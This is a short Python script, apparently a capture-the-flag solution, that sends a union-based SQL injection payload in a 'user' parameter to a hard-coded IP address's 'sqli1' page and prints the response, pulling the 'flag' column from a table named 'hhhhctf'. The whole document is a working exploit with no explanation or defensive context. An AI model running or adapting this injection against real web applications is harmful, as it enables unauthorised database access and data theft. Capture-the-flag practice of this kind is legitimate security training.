import requests
url = "http://45.32.25.65/nweb/sqli1/?user=user1'" \
      " or 1=1 union select 1,group_concat(flag) from hhhhctf-- hack"
re = requests.get(url)
print(re.text)